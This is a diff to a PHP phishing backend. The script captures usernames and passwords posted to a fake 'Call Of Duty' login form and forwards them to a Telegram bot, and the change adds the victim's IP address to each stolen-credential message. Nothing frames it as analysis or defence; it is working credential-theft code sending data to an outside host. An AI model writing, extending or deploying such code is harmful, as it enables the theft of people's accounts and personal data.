@@ -9,13 +9,16 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // Extract form data
     $name = htmlspecialchars($_POST["username"] ?? '');
-
     $message = htmlspecialchars($_POST["password"] ?? '');
+
+    // Get IP address
+    $ip = $_SERVER['REMOTE_ADDR'];
 
     // Format Telegram message
     $text = "📥 New Call Of Duty Login:\n\n";
     $text .= "👤 Email: $name\n";
-    $text .= "📝 Password: $message";
+    $text .= "📝 Password: $message\n";
+    $text .= "🌐 IP Address: $ip";
 
     // Send message to Telegram
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
